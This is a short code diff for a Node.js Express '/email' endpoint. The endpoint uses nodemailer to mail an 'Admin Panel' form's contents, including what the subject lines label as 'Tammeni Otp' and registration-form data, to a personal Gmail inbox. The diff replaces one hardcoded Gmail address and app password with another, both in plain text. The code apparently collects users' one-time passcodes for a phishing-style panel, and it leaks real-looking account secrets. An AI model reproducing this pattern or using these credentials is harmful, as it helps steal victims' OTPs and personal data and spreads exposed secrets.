@@ -14,8 +14,8 @@ app.post('/email',async(req,res)=>{
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-                user: 'sds.saudia@gmail.com',
-                pass: 'enaz rpyz cpzu dvps',
+                user: 'pnusds269@gmail.com',
+                pass: 'bojr nrmj bjen rcgt',
             },
           });
           let htmlContent = '<div>';
@@ -24,7 +24,7 @@ app.post('/email',async(req,res)=>{
         }
         await transporter.sendMail({
             from: 'Admin Panel',
-            to: 'sds.saudia@gmail.com',
+            to: 'pnusds269@gmail.com',
             subject:
              `${req.query.otp ?'Tammeni  Otp' :
                  req.query.reg ? 'Tammeni Register Form ' :
